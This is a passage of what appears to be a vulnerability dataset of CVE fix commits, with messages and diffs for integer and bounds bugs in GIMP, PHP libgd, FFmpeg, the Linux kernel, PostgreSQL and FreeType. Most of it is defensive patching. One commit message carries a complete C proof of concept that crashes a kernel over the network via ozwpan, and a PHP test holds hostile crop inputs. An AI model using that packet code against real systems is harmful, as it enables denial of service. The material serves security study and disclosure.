lyr_a[lidx]->layer_mask.top =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.top);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.top);\n                     lyr_a[lidx]->layer_mask.left =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.left);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.left);\n                     lyr_a[lidx]->layer_mask.bottom =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.bottom);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.bottom);\n                     lyr_a[lidx]->layer_mask.right =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.right);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.right);\n                     lyr_a[lidx]->layer_mask.mask_flags.relative_pos =\n                       lyr_a[lidx]->layer_mask.flags & 1 ? TRUE : FALSE;\n                     lyr_a[lidx]->layer_mask.mask_flags.disabled =\ndiff --git a\/plug-ins\/file-psd\/psd.h b\/plug-ins\/file-psd\/psd.h\nindex 30e3cd1aba..e1b55bb920 100644\n--- a\/plug-ins\/file-psd\/psd.h\n+++ b\/plug-ins\/file-psd\/psd.h\n@@ -446,10 +446,10 @@ typedef struct\n \/* PSD Layer mask data (length 20) *\/\n typedef struct\n {\n-  guint32               top;                    \/* Layer top *\/\n-  guint32               left;                   \/* Layer left *\/\n-  guint32               bottom;                 \/* Layer bottom *\/\n-  guint32               right;                  \/* Layer right *\/\n+  gint32                top;                    \/* Layer top *\/\n+  gint32                left;                   \/* Layer left *\/\n+  gint32                bottom;                 \/* Layer bottom *\/\n+  gint32                right;                  \/* Layer right *\/\n   guchar                def_color;              \/* Default background colour *\/\n   guchar                flags;                  \/* Layer flags *\/\n   guchar                extra_def_color;        \/* Real default background colour *\/\n@@ -460,20 +460,20 @@ typedef struct\n \/* PSD Layer mask data (length 36) *\/\n typedef struct\n {\n-  guint32               top;                    \/* Layer top *\/\n-  guint32               left;                   \/* Layer left *\/\n-  guint32               bottom;                 \/* Layer bottom *\/\n-  guint32               right;                  \/* Layer right *\/\n+  gint32                top;                    \/* Layer top *\/\n+  gint32                left;                   \/* Layer left *\/\n+  gint32                bottom;                 \/* Layer bottom *\/\n+  gint32                right;                  \/* Layer right *\/\n } LayerMaskExtra;\n \n \/* PSD Layer data structure *\/\n typedef struct\n {\n   gboolean              drop;                   \/* Do not add layer to GIMP image *\/\n-  guint32               top;                    \/* Layer top *\/\n-  guint32               left;                   \/* Layer left *\/\n-  guint32               bottom;                 \/* Layer bottom *\/\n-  guint32               right;                  \/* Layer right *\/\n+  gint32                top;                    \/* Layer top *\/\n+  gint32                left;                   \/* Layer left *\/\n+  gint32                bottom;                 \/* Layer bottom *\/\n+  gint32                right;                  \/* Layer right *\/\n   guint16               num_channels;           \/* Number of channels *\/\n   ChannelLengthInfo    *chn_info;               \/* Channel length info *\/\n   gchar                 mode_key[4];            \/* Blend mode key *\/\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7226","CWE_ID":"189","category":"security","commit_id":"8f4a5373bb71590352fd934028d6dde5bc18530b","commit_message":"From 8f4a5373bb71590352fd934028d6dde5bc18530b Mon Sep 17 00:00:00 2001\nFrom: Remi Collet <remi@php.net>\nDate: Sat, 28 Dec 2013 14:22:13 +0100\nSubject: [PATCH] Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())\n\nInitial fix was PHP stuff\nThis one is libgd fix.\n\n- filter invalid crop size\n- dont try to copy on invalid position\n- fix crop size when out of src image\n- fix possible NULL deref\n- fix possible integer overfloow\n---\n NEWS                       |  3 ++-\n ext\/gd\/libgd\/gd_crop.c     | 52 ++++++++++++++++++++++++++++------------------\n ext\/gd\/tests\/bug66356.phpt | 22 ++++++++++++++++++--\n 3 files changed, 54 insertions(+), 23 deletions(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 86eeb7c..aed16cc 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -29,7 +29,8 @@ PHP                                                                        NEWS\n   . Fixed bug #66229 (128.0.0.0\/16 isn't reserved any longer). (Adam)\n \n - GD:\n-  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()). (Laruence)\n+  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()).\n+    (Laruence, Remi)\n   . Fixed bug #64405 (Use freetype-config for determining freetype2 dir(s)).\n     (Adam)\n     \ndiff --git a\/ext\/gd\/libgd\/gd_crop.c b\/ext\/gd\/libgd\/gd_crop.c\nindex f0b888a..90a99a6 100644\n--- a\/ext\/gd\/libgd\/gd_crop.c\n+++ b\/ext\/gd\/libgd\/gd_crop.c\n@@ -44,6 +44,12 @@ gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n {\n \tgdImagePtr dst;\n \n+\t\/* check size *\/\n+\tif (crop->width<=0 || crop->height<=0) {\n+\t\treturn NULL;\n+\t}\n+\n+\t\/* allocate the requested size (could be only partially filled) *\/\n \tif (src->trueColor) {\n \t\tdst = gdImageCreateTrueColor(crop->width, crop->height);\n \t\tgdImageSaveAlpha(dst, 1);\n@@ -51,37 +57,43 @@ gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n \t\tdst = gdImageCreate(crop->width, crop->height);\n \t\tgdImagePaletteCopy(dst, src);\n \t}\n+\tif (dst == NULL) {\n+\t\treturn NULL;\n+\t}\n \tdst->transparent = src->transparent;\n \n-\tif (src->sx < (crop->x + crop->width -1)) {\n-\t\tcrop->width = src->sx - crop->x + 1;\n+\t\/* check position in the src image *\/\n+\tif (crop->x < 0 || crop->x>=src->sx || crop->y<0 || crop->y>=src->sy) {\n+\t\treturn dst;\n+\t}\n+\n+\t\/* reduce size if needed *\/\n+\tif ((src->sx - crop->width) < crop->x) {\n+\t\tcrop->width = src->sx - crop->x;\n \t}\n-\tif (src->sy < (crop->y + crop->height -1)) {\n-\t\tcrop->height = src->sy - crop->y + 1;\n+\tif ((src->sy - crop->height) < crop->y) {\n+\t\tcrop->height = src->sy - crop->y;\n \t}\n+\n #if 0\n printf(\"rect->x: %i\\nrect->y: %i\\nrect->width: %i\\nrect->height: %i\\n\", crop->x, crop->y, crop->width, crop->height);\n #endif\n-\tif (dst == NULL) {\n-\t\treturn NULL;\n+\tint y = crop->y;\n+\tif (src->trueColor) {\n+\t\tunsigned int dst_y = 0;\n+\t\twhile (y < (crop->y + (crop->height - 1))) {\n+\t\t\t\/* TODO: replace 4 w\/byte per channel||pitch once available *\/\n+\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n+\t\t}\n \t} else {\n-\t\tint y = crop->y;\n-\t\tif (src->trueColor) {\n-\t\t\tunsigned int dst_y = 0;\n-\t\t\twhile (y < (crop->y + (crop->height - 1))) {\n-\t\t\t\t\/* TODO: replace 4 w\/byte per channel||pitch once available *\/\n-\t\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n-\t\t\t}\n-\t\t} else {\n-\t\t\tint x;\n-\t\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n-\t\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n-\t\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n-\t\t\t\t}\n+\t\tint x;\n+\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n+\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n+\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n \t\t\t}\n \t\t}\n-\t\treturn dst;\n \t}\n+\treturn dst;\n }\n \n \/**\ndiff --git a\/ext\/gd\/tests\/bug66356.phpt b\/ext\/gd\/tests\/bug66356.phpt\nindex f881494..2da91d6 100644\n--- a\/ext\/gd\/tests\/bug66356.phpt\n+++ b\/ext\/gd\/tests\/bug66356.phpt\n@@ -7,12 +7,27 @@ Bug #66356 (Heap Overflow Vulnerability in imagecrop())\n --FILE--\n <?php\n $img = imagecreatetruecolor(10, 10);\n-$img = imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10));\n+\n+\/\/ POC #1\n+var_dump(imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10)));\n+\n $arr = array(\"x\" => \"a\", \"y\" => \"12b\", \"width\" => 10, \"height\" => 10);\n-$img = imagecrop($img, $arr);\n+var_dump(imagecrop($img, $arr));\n print_r($arr);\n+\n+\/\/ POC #2\n+var_dump(imagecrop($img, array(\"x\" => 0, \"y\" => 0, \"width\" => -1, \"height\" => 10)));\n+\n+\/\/ POC #3\n+var_dump(imagecrop($img, array(\"x\" => -20, \"y\" => -20, \"width\" => 10, \"height\" => 10)));\n+\n+\/\/ POC #4\n+var_dump(imagecrop($img, array(\"x\" => 0x7fffff00, \"y\" => 0, \"width\" => 10, \"height\" => 10)));\n+\n ?>\n --EXPECTF--\n+resource(%d) of type (gd)\n+resource(%d) of type (gd)\n Array\n (\n     [x] => a\n@@ -20,3 +35,6 @@ Array\n     [width] => 10\n     [height] => 10\n )\n+bool(false)\n+resource(%d) of type (gd)\n+resource(%d) of type (gd)\n\\ No newline at end of file\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0864","CWE_ID":"189","category":"security","commit_id":"9547034f9120187e23ad76424dd4d70247e62212","commit_message":"From 9547034f9120187e23ad76424dd4d70247e62212 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Thu, 24 Jan 2013 23:11:10 +0100\nSubject: [PATCH] gifdec: gif_copy_img_rect: Fix end pointer\n\nFixes out of array accesses\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n(cherry picked from commit c10350358da58600884292c08a8690289b81de29)\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/gifdec.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/gifdec.c b\/libavcodec\/gifdec.c\nindex e5e84aea12..a916dfe8e7 100644\n--- a\/libavcodec\/gifdec.c\n+++ b\/libavcodec\/gifdec.c\n@@ -118,7 +118,7 @@ static void gif_copy_img_rect(const uint32_t *src, uint32_t *dst,\n     const uint32_t *src_px, *src_pr,\n                    *src_py = src + y_start,\n                    *dst_py = dst + y_start;\n-    const uint32_t *src_pb = src_py + t * linesize;\n+    const uint32_t *src_pb = src_py + h * linesize;\n     uint32_t *dst_px;\n \n     for (; src_py < src_pb; src_py += linesize, dst_py += linesize) {\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-4160","CWE_ID":"189","category":"security","commit_id":"253eacc070b114c2ec1f81b067d2fed7305467b0","commit_message":"From 253eacc070b114c2ec1f81b067d2fed7305467b0 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Sat, 30 Oct 2010 16:43:10 -0700\nSubject: net: Truncate recvfrom and sendto length to INT_MAX.\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/socket.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/net\/socket.c b\/net\/socket.c\nindex abf3e2561521..2808b4db46ee 100644\n--- a\/net\/socket.c\n+++ b\/net\/socket.c\n@@ -1652,6 +1652,8 @@ SYSCALL_DEFINE6(sendto, int, fd, void __user *, buff, size_t, len,\n \tstruct iovec iov;\n \tint fput_needed;\n \n+\tif (len > INT_MAX)\n+\t\tlen = INT_MAX;\n \tsock = sockfd_lookup_light(fd, &err, &fput_needed);\n \tif (!sock)\n \t\tgoto out;\n@@ -1709,6 +1711,8 @@ SYSCALL_DEFINE6(recvfrom, int, fd, void __user *, ubuf, size_t, size,\n \tint err, err2;\n \tint fput_needed;\n \n+\tif (size > INT_MAX)\n+\t\tsize = INT_MAX;\n \tsock = sockfd_lookup_light(fd, &err, &fput_needed);\n \tif (!sock)\n \t\tgoto out;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4015","CWE_ID":"189","category":"security","commit_id":"7ccb6dc2d3e266a551827bb99179708580f72431","commit_message":"From 7ccb6dc2d3e266a551827bb99179708580f72431 Mon Sep 17 00:00:00 2001\nFrom: Tom Lane <tgl@sss.pgh.pa.us>\nDate: Thu, 27 Jan 2011 17:41:41 -0500\nSubject: [PATCH] Prevent buffer overrun while parsing an integer in a\n \"query_int\" value.\n\ncontrib\/intarray's gettoken() uses a fixed-size buffer to collect an\ninteger's digits, and did not guard against overrunning the buffer.\nThis is at least a backend crash risk, and in principle might allow\narbitrary code execution.  The code didn't check for overflow of the\ninteger value either, which while not presenting a crash risk was still\nbad.\n\nThanks to Apple Inc's security team for reporting this issue and supplying\nthe fix.\n\nSecurity: CVE-2010-4015\n---\n contrib\/intarray\/_int_bool.c | 26 ++++++++++++++++----------\n 1 file changed, 16 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/contrib\/intarray\/_int_bool.c b\/contrib\/intarray\/_int_bool.c\nindex 3492100c0c..072e8cc897 100644\n--- a\/contrib\/intarray\/_int_bool.c\n+++ b\/contrib\/intarray\/_int_bool.c\n@@ -56,24 +56,25 @@ typedef struct\n static int4\n gettoken(WORKSTATE *state, int4 *val)\n {\n-\tchar\t\tnnn[16],\n-\t\t\t   *curnnn;\n+\tchar\t\tnnn[16];\n+\tint\t\t\tinnn;\n \n \t*val = 0;\t\t\t\t\t\/* default result *\/\n \n-\tcurnnn = nnn;\n+\tinnn = 0;\n \twhile (1)\n \t{\n+\t\tif (innn >= sizeof(nnn))\n+\t\t\treturn ERR;\t\t\t\/* buffer overrun => syntax error *\/\n \t\tswitch (state->state)\n \t\t{\n \t\t\tcase WAITOPERAND:\n-\t\t\t\tcurnnn = nnn;\n+\t\t\t\tinnn = 0;\n \t\t\t\tif ((*(state->buf) >= '0' && *(state->buf) <= '9') ||\n \t\t\t\t\t*(state->buf) == '-')\n \t\t\t\t{\n \t\t\t\t\tstate->state = WAITENDOPERAND;\n-\t\t\t\t\t*curnnn = *(state->buf);\n-\t\t\t\t\tcurnnn++;\n+\t\t\t\t\tnnn[innn++] = *(state->buf);\n \t\t\t\t}\n \t\t\t\telse if (*(state->buf) == '!')\n \t\t\t\t{\n@@ -93,13 +94,18 @@ gettoken(WORKSTATE *state, int4 *val)\n \t\t\tcase WAITENDOPERAND:\n \t\t\t\tif (*(state->buf) >= '0' && *(state->buf) <= '9')\n \t\t\t\t{\n-\t\t\t\t\t*curnnn = *(state->buf);\n-\t\t\t\t\tcurnnn++;\n+\t\t\t\t\tnnn[innn++] = *(state->buf);\n \t\t\t\t}\n \t\t\t\telse\n \t\t\t\t{\n-\t\t\t\t\t*curnnn = '\\0';\n-\t\t\t\t\t*val = (int4) atoi(nnn);\n+\t\t\t\t\tlong\tlval;\n+\n+\t\t\t\t\tnnn[innn] = '\\0';\n+\t\t\t\t\terrno = 0;\n+\t\t\t\t\tlval = strtol(nnn, NULL, 0);\n+\t\t\t\t\t*val = (int4) lval;\n+\t\t\t\t\tif (errno != 0 || (long) *val != lval)\n+\t\t\t\t\t\treturn ERR;\n \t\t\t\t\tstate->state = WAITOPERATOR;\n \t\t\t\t\treturn (state->count && *(state->buf) == '\\0')\n \t\t\t\t\t\t? ERR : VAL;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-3362","CWE_ID":"189","category":"security","commit_id":"c5cbda50793e311aa73489d12184ffd6761c9fbf","commit_message":"From c5cbda50793e311aa73489d12184ffd6761c9fbf Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Wed, 10 Aug 2011 13:28:36 +0200\nSubject: [PATCH] cavs: fix oCERT #2011-002 FFmpeg\/libavcodec insufficient\n boundary check\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/cavsdec.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/cavsdec.c b\/libavcodec\/cavsdec.c\nindex c6ccb06524..6e83a7d381 100644\n--- a\/libavcodec\/cavsdec.c\n+++ b\/libavcodec\/cavsdec.c\n@@ -115,7 +115,8 @@ static inline int get_ue_code(GetBitContext *gb, int order) {\n static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                  const struct dec_2dvlc *r, int esc_golomb_order,\n                                  int qp, uint8_t *dst, int stride) {\n-    int i, level_code, esc_code, level, run, mask;\n+    int i, esc_code, level, mask;\n+    unsigned int level_code, run;\n     DCTELEM level_buf[65];\n     uint8_t run_buf[65];\n     DCTELEM *block = h->block;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-4003","CWE_ID":"189","category":"security","commit_id":"04bf464a5dfd9ade0dda918e44366c2c61fce80b","commit_message":"From 04bf464a5dfd9ade0dda918e44366c2c61fce80b Mon Sep 17 00:00:00 2001\nFrom: \"Jason A. Donenfeld\" <Jason@zx2c4.com>\nDate: Fri, 29 May 2015 13:07:00 +0200\nSubject: ozwpan: divide-by-zero leading to panic\n\nA network supplied parameter was not checked before division, leading to\na divide-by-zero. Since this happens in the softirq path, it leads to a\ncrash. A PoC follows below, which requires the ozprotocol.h file from\nthis module.\n\n=-=-=-=-=-=\n\n #include <arpa\/inet.h>\n #include <linux\/if_packet.h>\n #include <net\/if.h>\n #include <netinet\/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys\/ioctl.h>\n #include <sys\/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t\tstruct oz_elt oz_elt2;\n\t\tstruct oz_multiple_fixed oz_multiple_fixed;\n\t} __packed packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 0,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t},\n\t\t.oz_elt2 = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_multiple_fixed)\n\t\t},\n\t\t.oz_multiple_fixed = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_USB_ENDPOINT_DATA,\n\t\t\t.endpoint = 0,\n\t\t\t.format = OZ_DATA_F_MULTIPLE_FIXED,\n\t\t\t.unit_size = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers\/staging\/ozwpan\/ozusbsvc1.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/staging\/ozwpan\/ozusbsvc1.c b\/drivers\/staging\/ozwpan\/ozusbsvc1.c\nindex b573ad3e9674..7b13dc910172 100644\n--- a\/drivers\/staging\/ozwpan\/ozusbsvc1.c\n+++ b\/drivers\/staging\/ozwpan\/ozusbsvc1.c\n@@ -326,7 +326,10 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,\n \t\t\tstruct oz_multiple_fixed *body =\n \t\t\t\t(struct oz_multiple_fixed *)data_hdr;\n \t\t\tu8 *data = body->data;\n-\t\t\tint n = (len - sizeof(struct oz_multiple_fixed)+1)\n+\t\t\tint n;\n+\t\t\tif (!body->unit_size)\n+\t\t\t\tbreak;\n+\t\t\tn = (len - sizeof(struct oz_multiple_fixed)+1)\n \t\t\t\t\/ body->unit_size;\n \t\t\twhile (n--) {\n \t\t\t\toz_hcd_data_ind(usb_ctx->hport, body->endpoint,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2008-2826","CWE_ID":"189","category":"security","commit_id":"735ce972fbc8a65fb17788debd7bbe7b4383cc62","commit_message":"From 735ce972fbc8a65fb17788debd7bbe7b4383cc62 Mon Sep 17 00:00:00 2001\nFrom: \"David S. Miller\" <davem@davemloft.net>\nDate: Fri, 20 Jun 2008 22:04:34 -0700\nSubject: sctp: Make sure N * sizeof(union sctp_addr) does not overflow.\n\nAs noticed by Gabriel Campana, the kmalloc() length arg\npassed in by sctp_getsockopt_local_addrs_old() can overflow\nif ->addr_num is large enough.\n\nTherefore, enforce an appropriate limit.\n\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/sctp\/socket.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/sctp\/socket.c b\/net\/sctp\/socket.c\nindex e7e3baf7009e..0dbcde6758ea 100644\n--- a\/net\/sctp\/socket.c\n+++ b\/net\/sctp\/socket.c\n@@ -4401,7 +4401,9 @@ static int sctp_getsockopt_local_addrs_old(struct sock *sk, int len,\n \tif (copy_from_user(&getaddrs, optval, len))\n \t\treturn -EFAULT;\n \n-\tif (getaddrs.addr_num <= 0) return -EINVAL;\n+\tif (getaddrs.addr_num <= 0 ||\n+\t    getaddrs.addr_num >= (INT_MAX \/ sizeof(union sctp_addr)))\n+\t\treturn -EINVAL;\n \t\/*\n \t *  For UDP-style sockets, id specifies the association to query.\n \t *  If the id field is set to the value '0' then the locally bound\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-2497","CWE_ID":"189","category":"security","commit_id":"7d3d2cc4fef72c6be9c454b3809c387e12b44cfc","commit_message":"From 7d3d2cc4fef72c6be9c454b3809c387e12b44cfc Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Wed, 9 Jun 2010 09:14:09 +0200\nSubject: Fix Savannah bug #30082.\n\n* src\/cff\/cffgload.c (cff_decoder_parse_charstrings)\n<cff_op_callothersubr>: Protect against stack underflow.\n---\n ChangeLog            |  9 ++++++++-\n src\/cff\/cffgload.c   |  2 ++\n src\/smooth\/ftgrays.c | 35 +++++++++++++++--------------------\n 3 files changed, 25 insertions(+), 21 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex df72e09..183237f 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,8 +1,15 @@\n+2010-06-09  Werner Lemberg  <wl@gnu.org>\n+\n+\tFix Savannah bug #30082.\n+\n+\t* src\/cff\/cffgload.c (cff_decoder_parse_charstrings)\n+\t<cff_op_callothersubr>: Protect against stack underflow.\n+\n 2010-06-08  Werner Lemberg  <wl@gnu.org>\n \n \tFix Savannah bug #30053.\n \n-\t* src\/cff\/cffparse (cff_parse_real): Handle border case where\n+\t* src\/cff\/cffparse.c (cff_parse_real): Handle border case where\n \t`fraction_length' has value 10.\n \n 2010-06-07  Werner Lemberg  <wl@gnu.org>\ndiff --git a\/src\/cff\/cffgload.c b\/src\/cff\/cffgload.c\nindex 9e4dfc5..58af356 100644\n--- a\/src\/cff\/cffgload.c\n+++ b\/src\/cff\/cffgload.c\n@@ -2275,6 +2275,8 @@\n           \/* this is the implementation described for `unknown' other  *\/\n           \/* subroutines in the Type1 spec.                            *\/\n           args -= 2 + ( args[-2] >> 16 );\n+          if ( args < stack )\n+            goto Stack_Underflow;\n           break;\n \n         case cff_op_pop:\ndiff --git a\/src\/smooth\/ftgrays.c b\/src\/smooth\/ftgrays.c\nindex 846e454..cef8188 100644\n--- a\/src\/smooth\/ftgrays.c\n+++ b\/src\/smooth\/ftgrays.c\n@@ -1007,45 +1007,40 @@\n                               const FT_Vector*  control2,\n                               const FT_Vector*  to )\n   {\n-    TPos        dx, dy, da, db;\n+    TPos        dx, dy;\n+    TPos        mid_x, mid_y;\n     int         top, level;\n     int*        levels;\n     FT_Vector*  arc;\n \n \n-    dx = DOWNSCALE( ras.x ) + to->x - ( control1->x << 1 );\n-    if ( dx < 0 )\n-      dx = -dx;\n-    dy = DOWNSCALE( ras.y ) + to->y - ( control1->y << 1 );\n-    if ( dy < 0 )\n-      dy = -dy;\n-    if ( dx < dy )\n-      dx = dy;\n-    da = dx;\n+    \/* Calculate midpoint and compare it with start and end. *\/\n+    mid_x = ( DOWNSCALE( ras.x ) + to->x +\n+              3 * ( control1->x + control2->x ) ) \/ 8;\n+    mid_y = ( DOWNSCALE( ras.y ) + to->y +\n+              3 * ( control1->y + control2->y ) ) \/ 8;\n \n-    dx = DOWNSCALE( ras.x ) + to->x - 3 * ( control1->x + control2->x );\n+    dx = DOWNSCALE( ras.x ) + to->x - ( mid_x << 1 );\n     if ( dx < 0 )\n       dx = -dx;\n-    dy = DOWNSCALE( ras.y ) + to->y - 3 * ( control1->x + control2->y );\n+    dy = DOWNSCALE( ras.y ) + to->y - ( mid_y << 1 );\n     if ( dy < 0 )\n       dy = -dy;\n     if ( dx < dy )\n       dx = dy;\n-    db = dx;\n \n+    \/* Check whether an approximation with straight lines is sufficient. *\/\n     level = 1;\n-    da    = da \/ ras.cubic_level;\n-    db    = db \/ ras.conic_level;\n-    while ( da > 0 || db > 0 )\n+    dx    = dx \/ ras.conic_level;\n+    while ( dx > 0 )\n     {\n-      da >>= 2;\n-      db >>= 3;\n+      dx >>= 3;\n       level++;\n     }\n \n     if ( level <= 1 )\n     {\n-      TPos   to_x, to_y, mid_x, mid_y;\n+      TPos   to_x, to_y;\n \n \n       to_x  = 